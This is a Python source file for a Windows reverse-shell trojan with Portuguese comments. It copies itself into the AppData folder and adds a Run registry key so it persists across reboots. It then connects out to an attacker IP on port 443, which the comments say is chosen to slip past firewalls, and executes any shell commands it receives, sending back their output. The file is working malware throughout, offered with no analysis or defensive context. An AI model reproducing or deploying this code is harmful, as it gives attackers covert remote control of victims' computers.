import socket
import subprocess
import os
import shutil
import winreg
import sys
from time import sleep
# shell reverso
# IP para se conectar com a máquina vitima (Ip ataque)
IP = "192.168.1.xx";
# muito utilizada para conexões em sites, e o firewall normalmente deixa passar
# não é regra para todo mundo
PORT = 443;

# %APPDATA%\Microsoft\Windows\
# Software\Microsoft\Windows\CurrentVersion\Run

PROGRAM = "TrojanPersistence";
REGISTRY_PATH = "Software\Microsoft\Windows\CurrentVersion\Run";

def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows');
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path);
            
        current_file = sys.executable 
        destination = os.path.join(appdata_path, f'{PROGRAM}.exe');
        
        if os.path.abspath(current_file) != os.path.abspath(destination):
            shutil.copy2(current_file, destination);
            return destination;
        return current_file;
    except Exception as e:
        print("Erro ao copiar para o sistema: ", e);
        return sys.executable;
    
def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_PATH,
            0,
            winreg.KEY_SET_VALUE
        );
        
        winreg.SetValueEx(key, PROGRAM, 0, winreg.REG_SZ, file_path);
        
        winreg.CloseKey(key);
        return True;
    except Exception as e:
        return False;       
    
def check_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_PATH,
            0,
            winreg.KEY_READ
        );
        value, _ = winreg.QueryValueEx(key, PROGRAM);
        winreg.CloseKey(key);
        return True;
    except FileNotFoundError:
        return False;
    except Exception as e:
        print(f'Error checking persistence: {e}');
        return False;     
    
def setup_persistence():
    try:
        if check_persistence():
            return;
        persistence_path = copy_to_system();
        add_to_registry(persistence_path);
    except Exception as e:
        print(f'Error setting up persistence: {e}');           

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
        c.connect((ip, port));
        c.send(b"[#] Client connected\n");
        return c;
    except Exception as e:
        print(f'[!] Error connecting to server: {e}');
    
    

def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip();
            if data == "/exit":
                return;
            else:
                cmd(c, data);
    except Exception as e:
        print(f'[!] Error receiving data: {e}');    
    
    
def cmd(c, data):
    try:
        if data.startswith("cd "):
            os.chdir(data[3:].strip());
            c.send(b"[i] Changed directory to");
            return 
        
        if data == "/check_persistence":
            if check_persistence():
                c.send(b"[+] Persistence Status:\n[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_PATH}\\{PROGRAM}\n\t[+] Status: Active\n".encode());
            else:
                c.send(b"[!] Persistence not found.\n");
                return
        if data == "/setup_persistence":
            setup_persistence();
            c.send(b"[+] Persistence setup completed.\n");
            return
            
        p = subprocess.Popen(data, shell=True, stdin= subprocess.PIPE, stderr= subprocess.PIPE, stdout= subprocess.PIPE);
        output = p.stdout.read() + p.stderr.read();
        if output:
            c.send(output + b"\n");
        else:
            c.send(b"[i] Command executed, but no output was returned.\n");    
    except Exception as e:
        print("Erro ao executar comando: ", e);    
    
        
        
if __name__ == "__main__":
    try:
        setup_persistence();
        while True:
            client = connect(IP, PORT);
            if client:
                listen(client);
            else:
                sleep(5)
    except KeyboardInterrupt:
        print("[!] Program stopped by user.");            
    except Exception as e:
        print("[!] Main connection error: ", e);            

